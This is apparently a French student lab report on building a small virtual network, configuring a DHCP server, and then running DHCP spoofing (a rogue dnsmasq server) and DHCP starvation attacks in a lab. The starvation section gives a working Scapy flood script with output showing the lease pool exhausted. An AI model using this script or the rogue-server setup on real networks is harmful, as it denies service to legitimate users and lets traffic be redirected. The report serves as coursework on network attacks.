**1. Configuration d'un réseau local simple
Trouver les adresses MAC des machines
Pour vérifier l'adresse MAC de chaque machine :**

```PC1> show ip```
```
NAME        : PC1[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         : 
MAC         : 00:50:79:66:68:00
LPORT       : 20002
RHOST:PORT  : 127.0.0.1:20003
MTU         : 1500
```
*Adresse MAC de PC1 : 00:50:79:66:68:00*


```PC2> show ip```

```
NAME        : PC2[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         : 
MAC         : 00:50:79:66:68:01
LPORT       : 20004
RHOST:PORT  : 127.0.0.1:20005
MTU         : 1500
```
*Adresse MAC de PC2 : 00:50:79:66:68:01*

**Attribuer des adresses IP manuellement
Pour donner une IP à chaque machine :**

```PC1> ip 10.1.1.1/24```
```
Checking for duplicate address...
PC1 : 10.1.1.1 255.255.255.0
```

```PC2> ip 10.1.1.2/24```
```
Checking for duplicate address...
PC2 : 10.1.1.2 255.255.255.0
```
**Tester la communication entre les machines
Avec la commande ping :**

```PC1> ping 10.1.1.2```
```
84 bytes from 10.1.1.2 icmp_seq=1 ttl=64 time=0.302 ms
84 bytes from 10.1.1.2 icmp_seq=2 ttl=64 time=1.539 ms
84 bytes from 10.1.1.2 icmp_seq=3 ttl=64 time=1.405 ms
84 bytes from 10.1.1.2 icmp_seq=4 ttl=64 time=1.170 ms
84 bytes from 10.1.1.2 icmp_seq=5 ttl=64 time=0.281 ms
```

```PC2> ping 10.1.1.1```
```
84 bytes from 10.1.1.1 icmp_seq=1 ttl=64 time=0.185 ms
84 bytes from 10.1.1.1 icmp_seq=2 ttl=64 time=0.165 ms``
84 bytes from 10.1.1.1 icmp_seq=3 ttl=64 time=0.367 ms
84 bytes from 10.1.1.1 icmp_seq=4 ttl=64 time=0.606 ms
84 bytes from 10.1.1.1 icmp_seq=5 ttl=64 time=0.453 ms
```

**Vérifier les adresses avec ARP**

```PC1> arp ```         
```
00:50:79:66:68:01  10.1.1.2 expires in 108 seconds
```

```PC2> arp```
``` 
00:50:79:66:68:00  10.1.1.1 expires in 106 seconds
```

**2. Ajouter un switch et une troisième machine**

```PC3> ip 10.1.1.3```
```
Checking for duplicate address...
PC3 : 10.1.1.3 255.255.255.0
```

**3. Installer un serveur DHCP**

**Donner un accès Internet à la machine dhcp.tp1.efrei**
```
[toto@efrei-xmg4agau1 ~]$ ping google.com
PING google.com (216.58.214.174) 56(84) bytes of data.
64 bytes from mad01s26-in-f174.1e100.net (216.58.214.174): icmp_seq q = 1 ttl I = 63 time 37.0 ms
64 bytes from par10s42-in-f14.1e100.net (216.58.214.174): icmp_seq=2 ttl I = 63 time=29.4 ms
```

**Installer et configurer un serveur DHCP**


je me suis aidé de ce tuto https://gitlab.com/it4lik/b2-network-virt/-/blob/main/memo/rocky_network.md
```
dnf-y install dhcp-server
vi /etc/dhcp/dhcpd.conf
systemctl enable --now dhcpd
```

```
authoritative;
subnet 10.1.1.0 netmask 255.255.255.0 {
	range 10.1.1.10 10.1.1.50;
	option broadcast-address 10.1.1.1;
	option routers 10.1.1.1;
}
```
**Récupérer une IP automatiquement depuis les 3 nodes**

```
PC1> dhcp
DORA IP 10.1.1.10/24 GW 10.1.1.1

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.1.1.10/24
GATEWAY     : 10.1.1.1
DNS         : 
DHCP SERVER : 10.1.1.253
DHCP LEASE  : 563, 570/285/498
MAC         : 00:50:79:66:68:01
LPORT       : 20007
RHOST:PORT  : 127.0.0.1:20008
MTU         : 1500
```

```
PC2> dhcp
DDORA IP 10.1.1.12/24 GW 10.1.1.1

PC2> show ip

NAME        : PC2[1]
IP/MASK     : 10.1.1.12/24
GATEWAY     : 10.1.1.1
DNS         : 
DHCP SERVER : 10.1.1.253
DHCP LEASE  : 594, 599/299/524
MAC         : 00:50:79:66:68:00
LPORT       : 20009
RHOST:PORT  : 127.0.0.1:20010
MTU         : 1500
```

```
PC3> dhcp
DDORA IP 10.1.1.11/24 GW 10.1.1.1

PC3> show ip

NAME        : PC3[1]
IP/MASK     : 10.1.1.11/24
GATEWAY     : 10.1.1.1
DNS         : 
DHCP SERVER : 10.1.1.253
DHCP LEASE  : 584, 599/299/524
MAC         : 00:50:79:66:68:02
LPORT       : 20011
RHOST:PORT  : 127.0.0.1:20012
MTU         : 1500
```


**4 DHCP spoofing**

Installation de dnsmasq

```
dnf install -y dnsmasq
```

Configuration de dnsmasq

```
port=0 # pour désactiver DNS
dhcp-range=10.1.1.210,10.1.1.250,255.255.255.0,12h
dhcp-authoritative
interface=enp0s3
```
**TEST**
```
PC4> dhcp
DDORA IP 10.1.1.248/24 GW 10.1.1.50
```

```
PC4> show ip

NAME        : PC4[1]
IP/MASK     : 10.1.1.248/24
```
```
PC2> dhcp
DDORA IP 10.1.1.246/24 GW 10.1.1.50
```
```
PC3> dhcp
DDORA IP 10.1.1.247/24 GW 10.1.1.50
```
```
PC4> dhcp
DORA IP 10.1.1.21/24 GW 10.1.1.1
```

**5 DHCP starvation**

*je vais utilsier le script de cette video*  https://www.youtube.com/watch?v=VW0szfPHeo0&ab_channel=DavidBombal

```
from scapy.all import *

conf.checkIPaddr = False

dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC()) \
				/IP(src='0.0.0.0',dst='255.255.255.255') \
				/UDP(sport=68,dport=67) \
				/BOOTP(op=1,chaddr = RandMAC()) \
				/DHCP(options=[('message-type','discover'),('end')])

sendp(dhcp_discover,iface='wlp4s0',loop=1,verbose=1)
```
**Effet de l'attaque**
Après avoir lancé le script :
•	Le serveur DHCP est à court d'adresses disponibles :

```DHCPDISCOVER from 64:38:3a:61:38:3a via enp0s3 network 10.1.1.0/24: no free leases ```

•	Les machines ne peuvent plus obtenir d’IP avec dhcp.




